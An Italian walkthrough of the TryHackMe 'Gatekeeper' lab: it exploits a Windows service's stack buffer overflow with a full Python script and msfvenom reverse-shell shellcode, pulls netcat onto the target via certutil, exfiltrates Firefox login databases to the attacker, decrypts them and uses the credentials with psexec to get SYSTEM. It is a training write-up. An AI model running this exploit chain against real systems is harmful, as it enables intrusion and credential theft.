
#bufferoverflows 

https://tryhackme.com/room/gatekeeper

Sconfiggi il Guardiano per spezzare le catene. Ma fai attenzione, dall'altra parte ti aspetta il fuoco.

```
nmap -Pn -v -p- 10.10.22.230
```
effettuiamo una prima scansione con nmap
```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
```

```
nmap -sVC -v -p135,139,31337,49152,49153,49154,49155 10.10.22.230
```

```
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Windows 7 Professional 7601 Service Pack 1 netbios-ssn
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.95%I=7%D=9/27%Time=68D7D0F0%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:62:d5:71:fc:2f (unknown)
| Names:
|   GATEKEEPER<00>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   GATEKEEPER<20>       Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb2-time: 
|   date: 2025-09-27T11:59:00
|_  start_date: 2025-09-27T11:52:45
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-27T07:59:00-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

vediamo cosa c'è sulla porta 31337
```
nc 10.10.22.230 31337
```
```
┌──(root㉿kali)-[/home/kali]
└─# nc 10.10.22.230 31337                                            
hello
Hello hello!!!
```
visto che c'è un servizio passiamo ad enumerare altre porte
diamo uno sguardo alle condivisioni SMB

```
smbclient -L 10.10.22.230
```

```
┌──(root㉿kali)-[/home/kali]
└─# smbclient -L 10.10.22.230
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.22.230 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

```
smbmap -H 10.10.22.230 -u 'anonymous'
```

```
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.22.230:445        Name: 10.10.22.230              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Users                                                   READ ONLY

```

connettiamoci alla condivisione Users di sola lettura

```
smbclient \\\\10.10.22.230\\Users
```
e navighiamo tra le cartelle
```
┌──(root㉿kali)-[/home/kali]
└─# smbclient \\\\10.10.22.230\\Users
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3878847 blocks available
smb: \> cd Share
smb: \Share\> ls
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

                7863807 blocks of size 4096. 3878847 blocks available
smb: \Share\> binary
binary: command not found
smb: \Share\> get gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (55.1 KiloBytes/sec) (average 55.1 KiloBytes/sec)
smb: \Share\> 
```
scarichiamo su nostro pc gatekeeper.exe
```
get gatekeeper.exe
```

trasferiamo il file su Windows per analizzarlo con Immunity Debugger

controlliamo con
```
natstat -ano
```
```
TCP    0.0.0.0:31337          0.0.0.0:0              LISTENING       40204
```

su quale porta sta funzionando

```
ipconfig
```
per vedere il nostro ip su Windows
```
192.168.1.103
```

ed ora da Kali possiamo provare a collegarci con netcat in locale

```
nc 192.168.1.103 31337
```
perfetto su kali abbiamo
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# nc 192.168.1.103 31337
Hello
Hello Hello!!!
```
e sul Windows
```
[+] Listening for connections.
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 6
Bytes sent: 15
```

possiamo iniziare a vedere se l'**applicazione ha vulnerabilità Buffer OverFlows**

Iniziamo ad immettere sempre più caratteri AAAAAAAAAAAA fino ad ottenere un Access violation.... 

Ora che siamo sicuri del BOF procediamo nel trovare tutte le informazioni necessarie per sfruttarlo

dobbiamo:
- utilizzare un fuzzer iniziale fino a far crashare il programma
- Trovare l'offset per il fuzz fino al superamento dell'EIP.
- Sovrascrivivere e prendere il controllo dell'EIP.
- Identificare e rimuovere i caratteri errati dal payload di prova
- Creare un payload e testarlo

Lo script esegue un semplice fuzzer TCP che invia pacchetti sempre più lunghi (incrementa di 50) all'applicazione in ascolto su ip:port fino a quando la connessione fallisce
```
nano bof1.py
```
```
#!/usr/bin/python3
import sys
import socket
from time import sleep

ip = "192.168.1.103"  # this my windows lab ip
port = 31337          # the application targeted port
buffer = 'A' * 50     # buffer

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send((buffer + '\r\n').encode())  # encode to bytes for Python 3
        s.close()
        sleep(1)
        buffer = buffer + 'A' * 50

    except Exception:
        print("fuzzing crashed at %s bytes" % str(len(buffer)))  # Python 3 print
        sys.exit()
```
avviamo gatekeeper.exe con Immunity Debugger (ricordarsi di premere F9 per uscire dalla pausa) e successivamente lanciamo lo script
```
python3 bof1.py
```

```
[+] Listening for connections.
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 52
Bytes sent: 61
Client disconnected.
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 102
Bytes sent: 111
Client disconnected.
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 152
send failed: 10038
```

```
EIP 42424242
```
ora abbiamo la dimensione di overflow`152`

ora apriamo un'altro terminale in kali e visto che precedentemente abbiamo mandato in blocco tutto con 152 caratteri

per individuare l'offset preciso in cui il `EIP` puntatore all'istruzione estesa è stato sovrascritto,

creeremo un pattern univoco utilizzando il `Metasploit`modulo `pattern_create.rb`

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 152
```

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af
```

ora immettiamo questo testo alla richiesta della chat di Immettere il Messaggio

- su **Immunity Debugger** abbiamo ottenuto un **Access violation** e il valore **EIP è 39654138**

ora utilizziamo lo script di offset del modello msf per trovare la lunghezza del carattere di cui abbiamo bisogno (la lunghezza esatta che manda in crash l'applicazione):

```
msf-pattern_offset -l 152 -q 39654138
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# msf-pattern_offset -l 152 -q 39654138
[*] Exact match at offset 146
                                  
```

Ora dobbiamo costruire il nostro script Python che useremo per sfruttare il buffer overflows
- Modifichiamo l'offset a 146, il che renderà la variabile di overflow uguale a una stringa di 146 "A".  
- modifichiamo la variabile retn in "BBBB".  

 Reimpostiamo il programma gatekeeper.exe ed eseguiamo nuovamente lo script di exploit per verificare se abbiamo iniettato correttamente "BBBB" o 42424242 come indirizzo di ritorno EIP.

```
#!/usr/bin/python3
import sys
import socket
from time import sleep

ip = "192.168.1.103"  # this my windows lab ip
port = 31337          # the application targeted port

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB" # EIP (4 bytes)
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18"
padding = ""
payload = ""
postfix = ""
buffer = prefix + overflow + retn + badchars + payload + postfix

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send((buffer + '\r\n').encode())  # encode to bytes for Python 3
        s.close()
        sleep(1)
        buffer = buffer

    except Exception:
        print("fuzzing crashed at %s bytes" % str(len(buffer)))  # Python 3 print
        sys.exit()
```

```
EAX FFFFFFFF
ECX 4E671D67
EDX 00000000
EBX 007F8248
ESP 009E19E8 ASCII "
!!!
"
EBP 41414141
ESI 08041470 gatekeep.08041470
EDI 007F8248
EIP 42424242
C 0  ES 002B 32bit 0(FFFFFFFF)
```
perfetto!

#cattivicaratteri 
Creiamo un array di byte escludendo \x00, che è il killer per eccellenza di caratteri errati/shellcode.

utilizziamo mona 
```
!mona bytearray -b "\x00"
```
oppure 

Su questo sito https://github.com/cytopia/badchars
 Abbiamo un generatore di caratteri esadecimali errati per istruire i codificatori come **shikata-ga-nai** a trasformarli in altri caratteri.

Quindi ora aggiungiamo allo script
```
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18"
```
rieseguiamo il tutto controllando su **Immunity Debugger** se abbiamo le nostre A (41), poi le B (42) e infine i nostri caratteri errati al contrario

```
00C219E0   41414141  AAAA
00C219E4   42424242  BBBB
00C219E8   04030201  
00C219EC   08070605  
00C219F0   21212109  .!!!
00C219F4   4141000A  ..AA
00C219F8   41414141  AAAA
00C219FC   41414141  AAAA
```

vediamo che da 01 a 09 tutto regolare dopo dal carattere 0a è sbagliato

ora se modifichiamo la stringa escludendolo 

```
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18"
```
```
00C319E0   41414141  AAAA
00C319E4   42424242  BBBB
00C319E8   04030201  
00C319EC   08070605  
00C319F0   0D0C0B09  ...
00C319F4   11100F0E  
00C319F8   15141312  
00C319FC   0D181716  .
00C31A00   0A212121  !!!.
```
tutto il resto è regolare 

Quindi ricapitolando quando creeremo il nostro payload con msfvenom dovremmo escludere questi due cattivi caratteri `\x00\x0a`

Per poter saltare al codice iniettato, dobbiamo trovare un'istruzione "jmp esp" che sia già utilizzata da questo programma. 

Per farlo, **utilizziamo mona**

`!mona jmp -r <register> -cpb <bad_characters>`  

```
!mona jmp -r esp -cpb "\x00\x0a"
```

Abbiamo trovato due puntatori che includono un'istruzione jmp esp e, cosa ancora migliore, non hanno protezioni di memoria abilitate (DEP, ASLR, SafeSEH). 
```
0BADF00D       - Number of pointers of type 'jmp esp' : 2
0BADF00D   [+] Results :
080414C3     0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (C:\Users\XXXXX\Desktop\Test2\gatekeeper.exe), 0x8000
080416BF     0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (C:\Users\XXXXX\Desktop\Test2\gatekeeper.exe), 0x8000
0BADF00D       Found a total of 2 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:01.276000

```

```
JMP ESP 0x080414c3 
JMP ESP 0x080416bf
```
	indirizzo del puntatore

Se chiamiamo questa istruzione, possiamo inviare il programma ovunque punti ESP.  

Che dobbiamo trasformare in **Little Endian** che è il metodo in cui il valore è disposto dal byte meno significativo al byte più significativo:
quindi riscriviamo dal meno  byte significativo

Es: 0x080414c3 diventa 
```
\xc3\x14\x04\x08
```
l'altro
```
\xBF\x16\x04\x08
```
L'indirizzo jmp esp verrà utilizzato come variabile 'retn' nel nostro script, per essere iniettato nel registro EIP del programma di destinazione e, in definitiva, per indirizzare il programma allo shellcode che inietteremo nello stack.

Ora generiamo lo shellcode per una reverse shell usando **msfvenom**.

dovremmo escludere questi due cattivi caratteri `\x00\x0a`

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.99.134 LPORT=1234 -b "\x00\x0A" -f c -e x86/shikata_ga_nai
```

```
"\xb8\xbb\xb8\x47\x7d\xdb\xd4\xd9\x74\x24\xf4\x5b\x31\xc9"
"\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\xf8\xb6\xa5\x88\x02"
"\x2e\xab\x73\xfa\xaf\xcc\xfa\x1f\x9e\xcc\x99\x54\xb1\xfc"
"\xea\x38\x3e\x76\xbe\xa8\xb5\xfa\x17\xdf\x7e\xb0\x41\xee"
"\x7f\xe9\xb2\x71\xfc\xf0\xe6\x51\x3d\x3b\xfb\x90\x7a\x26"
"\xf6\xc0\xd3\x2c\xa5\xf4\x50\x78\x76\x7f\x2a\x6c\xfe\x9c"
"\xfb\x8f\x2f\x33\x77\xd6\xef\xb2\x54\x62\xa6\xac\xb9\x4f"
"\x70\x47\x09\x3b\x83\x81\x43\xc4\x28\xec\x6b\x37\x30\x29"
"\x4b\xa8\x47\x43\xaf\x55\x50\x90\xcd\x81\xd5\x02\x75\x41"
"\x4d\xee\x87\x86\x08\x65\x8b\x63\x5e\x21\x88\x72\xb3\x5a"
"\xb4\xff\x32\x8c\x3c\xbb\x10\x08\x64\x1f\x38\x09\xc0\xce"
"\x45\x49\xab\xaf\xe3\x02\x46\xbb\x99\x49\x0f\x08\x90\x71"
"\xcf\x06\xa3\x02\xfd\x89\x1f\x8c\x4d\x41\x86\x4b\xb1\x78"
"\x7e\xc3\x4c\x83\x7f\xca\x8a\xd7\x2f\x64\x3a\x58\xa4\x74"
"\xc3\x8d\x6b\x24\x6b\x7e\xcc\x94\xcb\x2e\xa4\xfe\xc3\x11"
"\xd4\x01\x0e\x3a\x7f\xf8\xd9\x4f\x8e\x61\x9c\x38\x8c\x65"
"\xa4\x6a\x19\x83\xce\x9a\x4c\x1c\x67\x02\xd5\xd6\x16\xcb"
"\xc3\x93\x19\x47\xe0\x64\xd7\xa0\x8d\x76\x80\x40\xd8\x24"
"\x07\x5e\xf6\x40\xcb\xcd\x9d\x90\x82\xed\x09\xc7\xc3\xc0"
"\x43\x8d\xf9\x7b\xfa\xb3\x03\x1d\xc5\x77\xd8\xde\xc8\x76"
"\xad\x5b\xef\x68\x6b\x63\xab\xdc\x23\x32\x65\x8a\x85\xec"
"\xc7\x64\x5c\x42\x8e\xe0\x19\xa8\x11\x76\x26\xe5\xe7\x96"
"\x97\x50\xbe\xa9\x18\x35\x36\xd2\x44\xa5\xb9\x09\xcd\xd5"
"\xf3\x13\x64\x7e\x5a\xc6\x34\xe3\x5d\x3d\x7a\x1a\xde\xb7"
"\x03\xd9\xfe\xb2\x06\xa5\xb8\x2f\x7b\xb6\x2c\x4f\x28\xb7"
"\x64";
```

Ora creiamo lo script finale

Abbiamo
```
offset = 146
```
	il nostro overflow
```
retn = "\xBF\x16\x04\x08"
```
	il puntatore all'istruzione jmp esp trovato in precedenza
```
padding = "\x90" * 16
```
	Il nostro codice potrebbe essere interrotto, l'aggiunta di una slitta NOP ne garantisce il funzionamento
``` 
shell ("\xb8\xbb\xb8\x47\x7d\xdb\xd4\xd9\x74\x24\xf4\x5b\x31\xc9"......
```
	ed infine il nostro shellcode Msfvenom

```
#!/usr/bin/env python3
import socket
import sys

# bad characters: \x00 \x0A
shell = (
b"\xb8\xbb\xb8\x47\x7d\xdb\xd4\xd9\x74\x24\xf4\x5b\x31\xc9"
b"\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\xf8\xb6\xa5\x88\x02"
b"\x2e\xab\x73\xfa\xaf\xcc\xfa\x1f\x9e\xcc\x99\x54\xb1\xfc"
b"\xea\x38\x3e\x76\xbe\xa8\xb5\xfa\x17\xdf\x7e\xb0\x41\xee"
b"\x7f\xe9\xb2\x71\xfc\xf0\xe6\x51\x3d\x3b\xfb\x90\x7a\x26"
b"\xf6\xc0\xd3\x2c\xa5\xf4\x50\x78\x76\x7f\x2a\x6c\xfe\x9c"
b"\xfb\x8f\x2f\x33\x77\xd6\xef\xb2\x54\x62\xa6\xac\xb9\x4f"
b"\x70\x47\x09\x3b\x83\x81\x43\xc4\x28\xec\x6b\x37\x30\x29"
b"\x4b\xa8\x47\x43\xaf\x55\x50\x90\xcd\x81\xd5\x02\x75\x41"
b"\x4d\xee\x87\x86\x08\x65\x8b\x63\x5e\x21\x88\x72\xb3\x5a"
b"\xb4\xff\x32\x8c\x3c\xbb\x10\x08\x64\x1f\x38\x09\xc0\xce"
b"\x45\x49\xab\xaf\xe3\x02\x46\xbb\x99\x49\x0f\x08\x90\x71"
b"\xcf\x06\xa3\x02\xfd\x89\x1f\x8c\x4d\x41\x86\x4b\xb1\x78"
b"\x7e\xc3\x4c\x83\x7f\xca\x8a\xd7\x2f\x64\x3a\x58\xa4\x74"
b"\xc3\x8d\x6b\x24\x6b\x7e\xcc\x94\xcb\x2e\xa4\xfe\xc3\x11"
b"\xd4\x01\x0e\x3a\x7f\xf8\xd9\x4f\x8e\x61\x9c\x38\x8c\x65"
b"\xa4\x6a\x19\x83\xce\x9a\x4c\x1c\x67\x02\xd5\xd6\x16\xcb"
b"\xc3\x93\x19\x47\xe0\x64\xd7\xa0\x8d\x76\x80\x40\xd8\x24"
b"\x07\x5e\xf6\x40\xcb\xcd\x9d\x90\x82\xed\x09\xc7\xc3\xc0"
b"\x43\x8d\xf9\x7b\xfa\xb3\x03\x1d\xc5\x77\xd8\xde\xc8\x76"
b"\xad\x5b\xef\x68\x6b\x63\xab\xdc\x23\x32\x65\x8a\x85\xec"
b"\xc7\x64\x5c\x42\x8e\xe0\x19\xa8\x11\x76\x26\xe5\xe7\x96"
b"\x97\x50\xbe\xa9\x18\x35\x36\xd2\x44\xa5\xb9\x09\xcd\xd5"
b"\xf3\x13\x64\x7e\x5a\xc6\x34\xe3\x5d\x3d\x7a\x1a\xde\xb7"
b"\x03\xd9\xfe\xb2\x06\xa5\xb8\x2f\x7b\xb6\x2c\x4f\x28\xb7"
b"\x64"
)

offset = 146
# JMP ESP little-endian
retn = b"\xBF\x16\x04\x08"  # 0x080416BF (usavi questa)
nop_sled = b"\x90" * 64

buffer = b"A" * offset + retn + nop_sled + shell

host = "10.10.134.9"
port = 31337

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("sending evil payload")
    s.sendall(buffer + b"\r\n")
    # Optional recv (may block) - comment out if not needed
    # data = s.recv(1024)
    print("Done!")
    s.close()
except Exception as e:
    print("error:", e)
    sys.exit(1)
```

ci mettiamo in ascolto sul nostro kali

```
nc -lvnp 1234
```

ed eseguiamo

```
python3 bof1.py
```

Otteniamo la shell
```
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.134.9] 49202
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami
whoami
gatekeeper\natbat

C:\Users\natbat\Desktop>

```
cerchiamo la prima flag
```
C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  09:24 PM    <DIR>          .
05/14/2020  09:24 PM    <DIR>          ..
04/21/2020  05:00 PM             1,197 Firefox.lnk
04/20/2020  01:27 AM            13,312 gatekeeper.exe
04/21/2020  09:53 PM               135 gatekeeperstart.bat
05/14/2020  09:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,919,153,152 bytes free

C:\Users\natbat\Desktop>type user.txt.txt
type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
C:\Users\natbat\Desktop>

```

**Ora bisogna scalare i privilegi**

Forze quel Firefox.lnk può essere un indizio!

Possiamo provare a recuperare delle credenziali dalla cache del browser 
visto che conosciamo il nome utente possiamo andare in
```
cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\
```
```
 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles

04/21/2020  05:00 PM    <DIR>          .
04/21/2020  05:00 PM    <DIR>          ..
05/14/2020  10:45 PM    <DIR>          ljfn812a.default-release
04/21/2020  05:00 PM    <DIR>          rajfzh3y.default
               0 File(s)              0 bytes
               4 Dir(s)  15,829,348,352 bytes free

```

 c'è una directory chiamata `ljfn812a.default-release` questa cartella salva gli accessi del browser

```
cd ljfn812a.default-release
```

Ci sono file importanti che potrebbero contenere login `key4.db`e `logins.json`.

Ora trasferiamo `key4.db`e `logins.json`al nostro Kali per farlo trasferiamo netcat sul pc windows

se non lo avete netcat scaricatelo e unzippatelo su linux
```
wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
```
ci mettiamo nella cartella dove abbiamo nc64.exe e creiamo un server python
```
python3 -m http.server 8888
```

Ora da windows utilizziamo certutil per scaricarci netcat

```
certutil -urlcache -f http://10.14.99.134:8888/nc.exe nc.exe
```

Ora che abbiamo netcat nel target Windows, usiamolo sulla nostra shell per ottenere key4.db e logins.json

da kali
```
nc -nlvp 1235 > logins.json
```

da Windows

```
nc.exe -nv 10.14.99.134 1235 < logins.json
```

facciamo lo stesso con il file key4.db. Ora che abbiamo due file possiamo recuperare da essi tutte le credenziali possibili per aumentare i nostri privilegi.

da kali
```
nc -nlvp 1235 > key4.db
```

da Windows

```
nc.exe -nv 10.14.99.134 1235 < key4.db
```

Per recuperare le password da quei file esiste uno script Python per farlo https://github.com/lclevy/firepwd

```
git clone https://github.com/lclevy/firepwd.git
```

```
cd firepwd
```
ora spostiamo i file key4.db e logins.json su questa directory

```
mv /home/kali/Downloads/Laboratori/logins.json .
```

```
mv /home/kali/Downloads/Laboratori/key4.db .
```

otteniamo le credenziali usando lo script firepwd

```
pip install -r requirements.txt
```

esegui lo script

```
python3 firepwd.py
```
 se da errori 
```
sudo apt update
sudo apt install python3-pycryptodome
```
```
python3 -m venv /tmp/venv
source /tmp/venv/bin/activate
python -m pip install --upgrade pip
pip install pycryptodome
python -c "from Crypto.Cipher import AES; print('ok')"
# poi lancia lo script con l'ambiente attivo:
python3 firepwd.py

```
```
pip install pyasn1
python3 firepwd.py
```
```
clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
```

Ottimo, ora abbiamo delle credenziali, usiamole con `psexec` 
questo strumento può eseguire qualsiasi comando sul sistema remoto, inclusi comandi interattivi come cmd.exe o powershell.exe

Quindi da kali
```
python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.192.147 cmd.exe
```

```
┌──(kali㉿kali)-[~/Downloads/Laboratori]
└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.192.147 cmd.exe
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.192.147.....
[*] Found writable share ADMIN$
[*] Uploading file EYqVKmoQ.exe
[*] Opening SVCManager on 10.10.192.147.....
[*] Creating service OhmK on 10.10.192.147.....
[*] Starting service OhmK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Siamo connessi ed amministratori!

```
C:\Windows\system32> cd c:\users\mayor\desktop
 
c:\Users\mayor\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of c:\Users\mayor\Desktop

05/14/2020  09:58 PM    <DIR>          .
05/14/2020  09:58 PM    <DIR>          ..
05/14/2020  09:21 PM                27 root.txt.txt
               1 File(s)             27 bytes
               2 Dir(s)  15,828,123,648 bytes free

c:\Users\mayor\Desktop> type root.txt.txt 
{xxxxxxxxxxxxxxx}
c:\Users\mayor\Desktop> 
```
Finalmente la nostra Flag!